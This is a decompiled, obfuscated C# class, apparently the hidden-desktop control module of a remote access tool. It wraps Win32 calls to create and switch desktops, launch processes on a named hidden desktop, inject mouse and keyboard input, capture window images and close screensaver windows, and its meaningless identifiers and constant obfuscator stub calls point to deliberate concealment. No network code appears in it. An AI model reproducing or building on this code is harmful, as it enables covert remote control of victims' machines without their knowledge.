using System;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using RemoteClient.Polices;

namespace sdfsdf.Containers
{
	// Token: 0x02000010 RID: 16
	internal class ParamRuleContainer
	{
		// Token: 0x0600002C RID: 44 RVA: 0x0000232D File Offset: 0x0000052D
		public static void ReadContext(Point instance, bool skipreg)
		{
			ParamRuleContainer.mouse_event(skipreg ? 2u : 4u, instance.X, instance.Y, 0, 0);
		}

		// Token: 0x0600002D RID: 45 RVA: 0x0000234B File Offset: 0x0000054B
		public static void AssetContext(Point ident, bool containsconnection)
		{
			ParamRuleContainer.mouse_event(containsconnection ? 8u : 16u, ident.X, ident.Y, 0, 0);
		}

		// Token: 0x0600002E RID: 46 RVA: 0x0000236A File Offset: 0x0000056A
		public static void GetContext(Point item)
		{
			ParamRuleContainer.SetCursorPos(item.X, item.Y);
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00002380 File Offset: 0x00000580
		public static void ConnectContext(Point key, bool settoken)
		{
			ParamRuleContainer.mouse_event(2048u, key.X, key.Y, settoken ? -120 : 120, 0);
		}

		// Token: 0x06000030 RID: 48 RVA: 0x000023A4 File Offset: 0x000005A4
		public static void OrderContext(byte maxparam, bool requirescounter)
		{
			ParamRuleContainer.keybd_event(maxparam, 0, requirescounter ? 0u : 2u, 0);
		}

		// Token: 0x06000031 RID: 49 RVA: 0x00004238 File Offset: 0x00002438
		public static int PatchContext(string var1, string cont)
		{
			ParamRuleContainer.Tokenizer tokenizer = default(ParamRuleContainer.Tokenizer);
			tokenizer.reg = Marshal.SizeOf(tokenizer);
			tokenizer.m_Dispatcher = "sdfsddfg";
			tokenizer.m_Base = 3;
			tokenizer._Dic = 1;
			int result;
			if (ParamRuleContainer.CreateProcess(var1, cont, IntPtr.Zero, IntPtr.Zero, false, 0u, IntPtr.Zero, null, ref tokenizer, ref ParamRuleContainer.@params))
			{
				result = 1;
			}
			else
			{
				result = Marshal.GetLastWin32Error();
			}
			return result;
		}

		// Token: 0x06000032 RID: 50 RVA: 0x000042A8 File Offset: 0x000024A8
		public static bool MoveContext()
		{
			IntPtr zero = IntPtr.Zero;
			ParamRuleContainer.SystemParametersInfo_1(114u, 0u, ref zero, 0u);
			return zero != IntPtr.Zero;
		}

		// Token: 0x06000033 RID: 51 RVA: 0x000042D4 File Offset: 0x000024D4
		public static void PrepareContext()
		{
			IntPtr intPtr = ParamRuleContainer.OpenDesktop("Screen-saver", 0, false, 129u);
			if (intPtr != IntPtr.Zero)
			{
				ParamRuleContainer.EnumDesktopWindows(intPtr, new ParamRuleContainer.StructRuleClass(ParamRuleContainer.ExceptionSpecificationQueue.proccesor.InterruptMapper), IntPtr.Zero);
				ParamRuleContainer.CloseDesktop(intPtr);
			}
			else
			{
				ParamRuleContainer.PostMessage(ParamRuleContainer.GetForegroundWindow(), 16, 0, 0);
			}
			IntPtr zero = IntPtr.Zero;
			ParamRuleContainer.SystemParametersInfo_1(17u, 1u, ref zero, 2u);
		}

		// Token: 0x06000034 RID: 52
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool CreateProcess(string init, string ivk, IntPtr third, IntPtr param2, bool isfirst3, uint idxsecond4, IntPtr first5, string def6, [In] ref ParamRuleContainer.Tokenizer cust7, ref ParamRuleContainer.Callback def8);

		// Token: 0x06000035 RID: 53
		[SuppressUnmanagedCodeSecurity]
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern int GetWindowText(IntPtr first, StringBuilder ivk, int proc_Y);

		// Token: 0x06000036 RID: 54
		[SuppressUnmanagedCodeSecurity]
		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr FindWindow(string instance, string token);

		// Token: 0x06000037 RID: 55
		[SuppressUnmanagedCodeSecurity]
		[DllImport("user32.dll")]
		public static extern int DefWindowProc(IntPtr config, ParamRuleContainer.AdvisorGetterLicense counter, IntPtr state, IntPtr param2);

		// Token: 0x06000038 RID: 56
		[SuppressUnmanagedCodeSecurity]
		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr GetThreadDesktop(uint offsetinfo);

		// Token: 0x06000039 RID: 57
		[SuppressUnmanagedCodeSecurity]
		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr ShowWindow(IntPtr instance, int indexreg);

		// Token: 0x0600003A RID: 58
		[SuppressUnmanagedCodeSecurity]
		[DllImport("user32.dll")]
		public static extern IntPtr SetWindowLong(IntPtr spec, int visitor_min, IntPtr c);

		// Token: 0x0600003B RID: 59
		[SuppressUnmanagedCodeSecurity]
		[DllImport("user32.dll")]
		public static extern IntPtr GetWindowLong(IntPtr config, int caller_min);

		// Token: 0x0600003C RID: 60
		[DllImport("user32.dll")]
		public static extern IntPtr SwitchDesktop(IntPtr res);

		// Token: 0x0600003D RID: 61
		[DllImport("user32.dll")]
		public static extern IntPtr GetActiveWindow();

		// Token: 0x0600003E RID: 62
		[DllImport("kernel32.dll")]
		public static extern uint GetCurrentThreadId();

		// Token: 0x0600003F RID: 63
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern int SystemParametersInfo(int spec_Z, int cfgmax, IntPtr field, int indexOf_value2);

		// Token: 0x06000040 RID: 64
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern int GetClassName(IntPtr last, StringBuilder ord, int indexOf_template);

		// Token: 0x06000041 RID: 65
		[SuppressUnmanagedCodeSecurity]
		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool IsWindowVisible(IntPtr first);

		// Token: 0x06000042 RID: 66
		[SuppressUnmanagedCodeSecurity]
		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool EnumWindows(ParamRuleContainer.Record instance, IntPtr cont);

		// Token: 0x06000043 RID: 67
		[SuppressUnmanagedCodeSecurity]
		[DllImport("user32.dll")]
		public static extern bool GetWindowRect(IntPtr asset, out ParamRuleContainer.RegParserResolver cont);

		// Token: 0x06000044 RID: 68
		[SuppressUnmanagedCodeSecurity]
		[DllImport("user32.dll")]
		public static extern bool PrintWindow(IntPtr spec, IntPtr map, int helper);

		// Token: 0x06000045 RID: 69
		[DllImport("user32.dll")]
		public static extern bool EnumDisplayDevices(string asset, uint selection, ref ParamRuleContainer.ThreadReponseFilter util, uint pred2);

		// Token: 0x06000046 RID: 70
		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr CreateDesktop(string asset, string selection, IntPtr serv, uint map2_offset, uint position_config3, IntPtr res4);

		// Token: 0x06000047 RID: 71
		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
		public static extern bool SetThreadDesktop(IntPtr asset);

		// Token: 0x06000048 RID: 72
		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
		public static extern IntPtr GetParent(IntPtr value);

		// Token: 0x06000049 RID: 73
		[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool DeleteFile(string info);

		// Token: 0x0600004A RID: 74
		[DllImport("user32.dll")]
		public static extern IntPtr GetForegroundWindow();

		// Token: 0x0600004B RID: 75
		[DllImport("user32.dll", EntryPoint = "DefWindowProc")]
		public static extern int DefWindowProc_1(IntPtr def, int indexOf_second, IntPtr util, IntPtr counter2);

		// Token: 0x0600004C RID: 76
		[DllImport("user32.dll", SetLastError = true)]
		public static extern int GetScrollPos(IntPtr asset, int next_second);

		// Token: 0x0600004D RID: 77
		[DllImport("user32.dll", SetLastError = true)]
		public static extern int SetScrollPos(IntPtr config, int rowconnection, int res_amount, IntPtr x2);

		// Token: 0x0600004E RID: 78
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
		public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string item);

		// Token: 0x0600004F RID: 79
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr GetProcAddress(IntPtr task, [MarshalAs(UnmanagedType.LPStr)] string ivk);

		// Token: 0x06000050 RID: 80
		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		public static extern int SendMessageA(IntPtr task, int indexOf_second, int max_dir, int pred2_start);

		// Token: 0x06000051 RID: 81
		[DllImport("user32.dll")]
		public static extern IntPtr GetDesktopWindow();

		// Token: 0x06000052 RID: 82
		[DllImport("user32.dll")]
		public static extern bool GetLastInputInfo(ref ParamRuleContainer.AdvisorParserResolver res);

		// Token: 0x06000053 RID: 83
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool SetCursorPos(int no__i, int ord);

		// Token: 0x06000054 RID: 84
		[DllImport("user32.dll")]
		public static extern void mouse_event(uint no__asset, int ivkmax, int num_filter, int indexOf_init2, int info3);

		// Token: 0x06000055 RID: 85
		[DllImport("user32.dll")]
		public static extern IntPtr WindowFromPoint(Point task);

		// Token: 0x06000056 RID: 86
		[DllImport("user32.dll")]
		public static extern IntPtr SetActiveWindow(IntPtr setup);

		// Token: 0x06000057 RID: 87
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool BringWindowToTop(IntPtr spec);

		// Token: 0x06000058 RID: 88
		[DllImport("user32.dll")]
		public static extern bool keybd_event(byte referenceY, byte mean_attr, uint indexdir, int last2_count);

		// Token: 0x06000059 RID: 89
		[DllImport("gdi32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool BitBlt([In] IntPtr instance, int caller_counter, int min_res, int offset_pol2, int v3high, [In] IntPtr setup4, int instance5_Low, int key6_Low, int offset_key7);

		// Token: 0x0600005A RID: 90
		[DllImport("gdi32.dll")]
		public static extern IntPtr CreateDC(string ident, string selection, string consumer, IntPtr first2);

		// Token: 0x0600005B RID: 91
		[DllImport("gdi32.dll")]
		public static extern bool DeleteDC([In] IntPtr last);

		// Token: 0x0600005C RID: 92
		[DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
		public static extern bool SystemParametersInfo_1(uint position_setup, uint no_b, ref IntPtr dir, uint columnspec2);

		// Token: 0x0600005D RID: 93
		[DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
		public static extern bool SystemParametersInfo_2(uint itemHigh, uint remove_CFGAt, ref bool res, uint size_vis2);

		// Token: 0x0600005E RID: 94
		[DllImport("user32.dll", SetLastError = true)]
		public static extern int PostMessage(IntPtr setup, int pol_start, int res, int indexOf_ident2);

		// Token: 0x0600005F RID: 95
		[DllImport("user32.dll")]
		public static extern IntPtr OpenDesktop(string first, int ord_Ptr, bool isc, uint end_info2);

		// Token: 0x06000060 RID: 96
		[DllImport("user32.dll")]
		public static extern bool CloseDesktop(IntPtr info);

		// Token: 0x06000061 RID: 97
		[DllImport("user32.dll")]
		public static extern bool EnumDesktopWindows(IntPtr setup, ParamRuleContainer.StructRuleClass token, IntPtr filter);

		// Token: 0x06000062 RID: 98
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool SetWindowPos(IntPtr ident, IntPtr map, int dircount, int next_param2, int token3, int map4_low, uint visitor5);

		// Token: 0x06000063 RID: 99 RVA: 0x00004358 File Offset: 0x00002558
		public static int CollectContext(int offsetsetup, int ivk_high)
		{
			return offsetsetup | ivk_high << 16;
		}

		// Token: 0x06000064 RID: 100
		[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "PostMessage", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool PostMessage_1(HandleRef var1, uint colHigh, IntPtr state, IntPtr def2);

		// Token: 0x06000065 RID: 101
		[DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
		public unsafe static extern int memcmp(byte* key, byte* result, uint temp_offset);

		// Token: 0x06000066 RID: 102
		[DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "memcmp")]
		public static extern int memcmp_1(IntPtr last, IntPtr caller, uint fieldLow);

		// Token: 0x06000067 RID: 103
		[DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
		public static extern int memcpy(IntPtr ident, IntPtr vis, uint thirdPosition);

		// Token: 0x06000068 RID: 104
		[DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "memcpy")]
		public unsafe static extern int memcpy_1(void* last, void* selection, uint indexOf_control);

		// Token: 0x06000069 RID: 105
		[DllImport("user32.dll")]
		public static extern bool EnumDisplayMonitors(IntPtr value, IntPtr connection, ParamRuleContainer.Instance field, IntPtr reference2);

		// Token: 0x0600006A RID: 106
		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		public static extern bool GetMonitorInfo(IntPtr last, ref ParamRuleContainer.Candidate cust);

		// Token: 0x0600006B RID: 107 RVA: 0x00002297 File Offset: 0x00000497
		public ParamRuleContainer()
		{
			InvocationProcessPolicy.CompareError();
			base..ctor();
		}

		// Token: 0x0600006C RID: 108 RVA: 0x000023B6 File Offset: 0x000005B6
		// Note: this type is marked as 'beforefieldinit'.
		static ParamRuleContainer()
		{
			InvocationProcessPolicy.CompareError();
			ParamRuleContainer.@params = default(ParamRuleContainer.Callback);
			ParamRuleContainer.param = new IntPtr(-1);
			ParamRuleContainer.m_Decorator = new IntPtr(-2);
			ParamRuleContainer.m_Registry = new IntPtr(0);
			ParamRuleContainer._Proxy = new IntPtr(1);
		}

		// Token: 0x04000033 RID: 51
		public static ParamRuleContainer.Callback @params;

		// Token: 0x04000034 RID: 52
		private static readonly IntPtr param;

		// Token: 0x04000035 RID: 53
		private static readonly IntPtr m_Decorator;

		// Token: 0x04000036 RID: 54
		private static readonly IntPtr m_Registry;

		// Token: 0x04000037 RID: 55
		private static readonly IntPtr _Proxy;

		// Token: 0x02000011 RID: 17
		public abstract class ComposerObjectDic
		{
			// Token: 0x0600006D RID: 109 RVA: 0x00002297 File Offset: 0x00000497
			protected ComposerObjectDic()
			{
				InvocationProcessPolicy.CompareError();
				base..ctor();
			}
		}

		// Token: 0x02000012 RID: 18
		public struct RegParserResolver
		{
			// Token: 0x0600006E RID: 110 RVA: 0x000023F5 File Offset: 0x000005F5
			public RegParserResolver(ParamRuleContainer.RegParserResolver task)
			{
				InvocationProcessPolicy.CompareError();
				this = new ParamRuleContainer.RegParserResolver(task.RateMapper(), task.DeleteMapper(), task.SetMapper(), task.SortMapper());
			}

			// Token: 0x0600006F RID: 111 RVA: 0x00002423 File Offset: 0x00000623
			public RegParserResolver(int previous_first, int callerPosition, int state_count, int idx_result2)
			{
				InvocationProcessPolicy.CompareError();
				this._Code = previous_first;
				this.repository = callerPosition;
				this.m_Publisher = state_count;
				this._Setter = idx_result2;
			}

			// Token: 0x06000070 RID: 112 RVA: 0x00004370 File Offset: 0x00002570
			public int CalcMapper()
			{
				return this._Code;
			}

			// Token: 0x06000071 RID: 113 RVA: 0x00002447 File Offset: 0x00000647
			public void DefineMapper(int item)
			{
				this._Code = item;
			}

			// Token: 0x06000072 RID: 114 RVA: 0x00004388 File Offset: 0x00002588
			public int InitMapper()
			{
				return this.repository;
			}

			// Token: 0x06000073 RID: 115 RVA: 0x00002450 File Offset: 0x00000650
			public void FillMapper(int def)
			{
				this.repository = def;
			}

			// Token: 0x06000074 RID: 116 RVA: 0x00004370 File Offset: 0x00002570
			public int RateMapper()
			{
				return this._Code;
			}

			// Token: 0x06000075 RID: 117 RVA: 0x00002447 File Offset: 0x00000647
			public void TestMapper(int spec_Ptr)
			{
				this._Code = spec_Ptr;
			}

			// Token: 0x06000076 RID: 118 RVA: 0x00004388 File Offset: 0x00002588
			public int DeleteMapper()
			{
				return this.repository;
			}

			// Token: 0x06000077 RID: 119 RVA: 0x00002450 File Offset: 0x00000650
			public void VisitMapper(int instance_end)
			{
				this.repository = instance_end;
			}

			// Token: 0x06000078 RID: 120 RVA: 0x000043A0 File Offset: 0x000025A0
			public int SetMapper()
			{
				return this.m_Publisher;
			}

			// Token: 0x06000079 RID: 121 RVA: 0x00002459 File Offset: 0x00000659
			public void FlushMapper(int task_Low)
			{
				this.m_Publisher = task_Low;
			}

			// Token: 0x0600007A RID: 122 RVA: 0x000043B8 File Offset: 0x000025B8
			public int SortMapper()
			{
				return this._Setter;
			}

			// Token: 0x0600007B RID: 123 RVA: 0x00002462 File Offset: 0x00000662
			public void ExcludeMapper(int idx_first)
			{
				this._Setter = idx_first;
			}

			// Token: 0x0600007C RID: 124 RVA: 0x000043D0 File Offset: 0x000025D0
			public int StartMapper()
			{
				return this._Setter - this.repository;
			}

			// Token: 0x0600007D RID: 125 RVA: 0x0000246B File Offset: 0x0000066B
			public void RunMapper(int row_setup)
			{
				this._Setter = row_setup + this.repository;
			}

			// Token: 0x0600007E RID: 126 RVA: 0x000043EC File Offset: 0x000025EC
			public int QueryMapper()
			{
				return this.m_Publisher - this._Code;
			}

			// Token: 0x0600007F RID: 127 RVA: 0x0000247B File Offset: 0x0000067B
			public void SelectMapper(int start_param)
			{
				this.m_Publisher = start_param + this._Code;
			}

			// Token: 0x17000002 RID: 2
			// (get) Token: 0x06000080 RID: 128 RVA: 0x00004408 File Offset: 0x00002608
			// (set) Token: 0x06000081 RID: 129 RVA: 0x0000248B File Offset: 0x0000068B
			public Point Location
			{
				get
				{
					return new Point(this.RateMapper(), this.DeleteMapper());
				}
				set
				{
					this._Code = value.X;
					this.repository = value.Y;
				}
			}

			// Token: 0x06000082 RID: 130 RVA: 0x00004428 File Offset: 0x00002628
			public Size VerifyMapper()
			{
				return new Size(this.QueryMapper(), this.StartMapper());
			}

			// Token: 0x06000083 RID: 131 RVA: 0x000024A7 File Offset: 0x000006A7
			public void CustomizeMapper(Size first)
			{
				this.m_Publisher = first.Width + this._Code;
				this._Setter = first.Height + this.repository;
			}

			// Token: 0x06000084 RID: 132 RVA: 0x00004448 File Offset: 0x00002648
			public static implicit operator Rectangle(ParamRuleContainer.RegParserResolver instance)
			{
				return new Rectangle(instance.RateMapper(), instance.DeleteMapper(), instance.QueryMapper(), instance.StartMapper());
			}

			// Token: 0x06000085 RID: 133 RVA: 0x00004478 File Offset: 0x00002678
			public static implicit operator ParamRuleContainer.RegParserResolver(Rectangle i)
			{
				return new ParamRuleContainer.RegParserResolver(i.Left, i.Top, i.Right, i.Bottom);
			}

			// Token: 0x06000086 RID: 134 RVA: 0x000024D1 File Offset: 0x000006D1
			public static bool operator ==(ParamRuleContainer.RegParserResolver last, ParamRuleContainer.RegParserResolver result)
			{
				return last.DisableMapper(result);
			}

			// Token: 0x06000087 RID: 135 RVA: 0x000024DB File Offset: 0x000006DB
			public static bool operator !=(ParamRuleContainer.RegParserResolver task, ParamRuleContainer.RegParserResolver ivk)
			{
				return !task.DisableMapper(ivk);
			}

			// Token: 0x06000088 RID: 136 RVA: 0x000044A8 File Offset: 0x000026A8
			public override string ToString()
			{
				return string.Concat(new object[]
				{
					"{Left: ",
					this._Code,
					"; Top: ",
					this.repository,
					"; Right: ",
					this.m_Publisher,
					"; Bottom: ",
					this._Setter,
					"}"
				});
			}

			// Token: 0x06000089 RID: 137 RVA: 0x00004524 File Offset: 0x00002724
			public override int GetHashCode()
			{
				return this.ToString().GetHashCode();
			}

			// Token: 0x0600008A RID: 138 RVA: 0x00004544 File Offset: 0x00002744
			public bool DisableMapper(ParamRuleContainer.RegParserResolver setup)
			{
				return setup.RateMapper() == this._Code && setup.DeleteMapper() == this.repository && setup.SetMapper() == this.m_Publisher && setup.SortMapper() == this._Setter;
			}

			// Token: 0x04000038 RID: 56
			private int _Code;

			// Token: 0x04000039 RID: 57
			private int repository;

			// Token: 0x0400003A RID: 58
			private int m_Publisher;

			// Token: 0x0400003B RID: 59
			private int _Setter;
		}

		// Token: 0x02000013 RID: 19
		public enum Database : uint
		{

		}

		// Token: 0x02000014 RID: 20
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct Tokenizer
		{
			// Token: 0x0400003D RID: 61
			public int reg;

			// Token: 0x0400003E RID: 62
			public string _Advisor;

			// Token: 0x0400003F RID: 63
			public string m_Dispatcher;

			// Token: 0x04000040 RID: 64
			public string _Comparator;

			// Token: 0x04000041 RID: 65
			public int m_Order;

			// Token: 0x04000042 RID: 66
			public int @event;

			// Token: 0x04000043 RID: 67
			public int m_Singleton;

			// Token: 0x04000044 RID: 68
			public int m_Creator;

			// Token: 0x04000045 RID: 69
			public int account;

			// Token: 0x04000046 RID: 70
			public int connection;

			// Token: 0x04000047 RID: 71
			public int _Tag;

			// Token: 0x04000048 RID: 72
			public int _Dic;

			// Token: 0x04000049 RID: 73
			public short m_Base;

			// Token: 0x0400004A RID: 74
			public short m_Container;

			// Token: 0x0400004B RID: 75
			public IntPtr _Invocation;

			// Token: 0x0400004C RID: 76
			public IntPtr _Exporter;

			// Token: 0x0400004D RID: 77
			public IntPtr m_List;

			// Token: 0x0400004E RID: 78
			public IntPtr configuration;
		}

		// Token: 0x02000015 RID: 21
		public struct Callback
		{
			// Token: 0x0400004F RID: 79
			public IntPtr _Template;

			// Token: 0x04000050 RID: 80
			public IntPtr m_Filter;

			// Token: 0x04000051 RID: 81
			public int composer;

			// Token: 0x04000052 RID: 82
			public int m_Definition;
		}

		// Token: 0x02000016 RID: 22
		public enum AdvisorGetterLicense : uint
		{
			// Token: 0x04000054 RID: 84
			[Obsolete]
			_Mapping = 68u,
			// Token: 0x04000055 RID: 85
			[Obsolete]
			serializer = 72u
		}

		// Token: 0x02000017 RID: 23
		// (Invoke) Token: 0x0600008C RID: 140
		public delegate bool Record(IntPtr hWnd, IntPtr lParam);

		// Token: 0x02000018 RID: 24
		[Flags]
		public enum DefinitionObjectDic
		{

		}

		// Token: 0x02000019 RID: 25
		public struct ThreadReponseFilter
		{
			// Token: 0x04000057 RID: 87
			[MarshalAs(UnmanagedType.U4)]
			public int _Adapter;

			// Token: 0x04000058 RID: 88
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
			public string map;

			// Token: 0x04000059 RID: 89
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
			public string parameter;

			// Token: 0x0400005A RID: 90
			[MarshalAs(UnmanagedType.U4)]
			public ParamRuleContainer.DefinitionObjectDic model;

			// Token: 0x0400005B RID: 91
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
			public string initializer;

			// Token: 0x0400005C RID: 92
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
			public string wrapper;
		}

		// Token: 0x0200001A RID: 26
		public struct AdvisorParserResolver
		{
			// Token: 0x0600008F RID: 143 RVA: 0x000024E8 File Offset: 0x000006E8
			// Note: this type is marked as 'beforefieldinit'.
			static AdvisorParserResolver()
			{
				InvocationProcessPolicy.CompareError();
				ParamRuleContainer.AdvisorParserResolver.m_Attribute = Marshal.SizeOf(typeof(ParamRuleContainer.AdvisorParserResolver));
			}

			// Token: 0x0400005D RID: 93
			public static readonly int m_Attribute;

			// Token: 0x0400005E RID: 94
			[MarshalAs(UnmanagedType.U4)]
			public uint global;

			// Token: 0x0400005F RID: 95
			[MarshalAs(UnmanagedType.U4)]
			public uint m_Rules;
		}

		// Token: 0x0200001B RID: 27
		// (Invoke) Token: 0x06000091 RID: 145
		public delegate bool StructRuleClass(IntPtr hDesktop, IntPtr lParam);

		// Token: 0x0200001C RID: 28
		public static class ResolverProductPage
		{
			// Token: 0x06000094 RID: 148 RVA: 0x00002503 File Offset: 0x00000703
			// Note: this type is marked as 'beforefieldinit'.
			static ResolverProductPage()
			{
				InvocationProcessPolicy.CompareError();
				ParamRuleContainer.ResolverProductPage.m_Identifier = new IntPtr(-2);
				ParamRuleContainer.ResolverProductPage.facade = new IntPtr(-1);
				ParamRuleContainer.ResolverProductPage.resolver = new IntPtr(0);
				ParamRuleContainer.ResolverProductPage.mock = new IntPtr(1);
			}

			// Token: 0x04000060 RID: 96
			public static IntPtr m_Identifier;

			// Token: 0x04000061 RID: 97
			public static IntPtr facade;

			// Token: 0x04000062 RID: 98
			public static IntPtr resolver;

			// Token: 0x04000063 RID: 99
			public static IntPtr mock;
		}

		// Token: 0x0200001D RID: 29
		public enum DecoratorRuleContainer
		{

		}

		// Token: 0x0200001E RID: 30
		// (Invoke) Token: 0x06000096 RID: 150
		public delegate bool Instance(IntPtr hMonitor, IntPtr hdcMonitor, ref ParamRuleContainer.MerchantRuleClass lprcMonitor, IntPtr dwData);

		// Token: 0x0200001F RID: 31
		public struct MerchantRuleClass
		{
			// Token: 0x04000065 RID: 101
			public int m_Annotation;

			// Token: 0x04000066 RID: 102
			public int m_State;

			// Token: 0x04000067 RID: 103
			public int strategy;

			// Token: 0x04000068 RID: 104
			public int page;
		}

		// Token: 0x02000020 RID: 32
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
		internal struct Candidate
		{
			// Token: 0x06000099 RID: 153 RVA: 0x00002537 File Offset: 0x00000737
			public void CallMapper()
			{
				this.queue = 104;
				this._Manager = string.Empty;
			}

			// Token: 0x04000069 RID: 105
			public int queue;

			// Token: 0x0400006A RID: 106
			public ParamRuleContainer.MerchantRuleClass config;

			// Token: 0x0400006B RID: 107
			public ParamRuleContainer.MerchantRuleClass _Authentication;

			// Token: 0x0400006C RID: 108
			public uint m_Field;

			// Token: 0x0400006D RID: 109
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
			public string _Manager;
		}

		// Token: 0x02000021 RID: 33
		[CompilerGenerated]
		[Serializable]
		private sealed class ExceptionSpecificationQueue
		{
			// Token: 0x0600009A RID: 154 RVA: 0x0000254C File Offset: 0x0000074C
			// Note: this type is marked as 'beforefieldinit'.
			static ExceptionSpecificationQueue()
			{
				InvocationProcessPolicy.CompareError();
				ParamRuleContainer.ExceptionSpecificationQueue.proccesor = new ParamRuleContainer.ExceptionSpecificationQueue();
			}

			// Token: 0x0600009B RID: 155 RVA: 0x00002297 File Offset: 0x00000497
			public ExceptionSpecificationQueue()
			{
				InvocationProcessPolicy.CompareError();
				base..ctor();
			}

			// Token: 0x0600009C RID: 156 RVA: 0x0000255D File Offset: 0x0000075D
			internal bool InterruptMapper(IntPtr asset, IntPtr caller)
			{
				if (ParamRuleContainer.IsWindowVisible(asset))
				{
					ParamRuleContainer.PostMessage(asset, 16, 0, 0);
				}
				return true;
			}

			// Token: 0x0400006E RID: 110
			public static readonly ParamRuleContainer.ExceptionSpecificationQueue proccesor;

			// Token: 0x0400006F RID: 111
			public static ParamRuleContainer.StructRuleClass m_Exception;
		}
	}
}
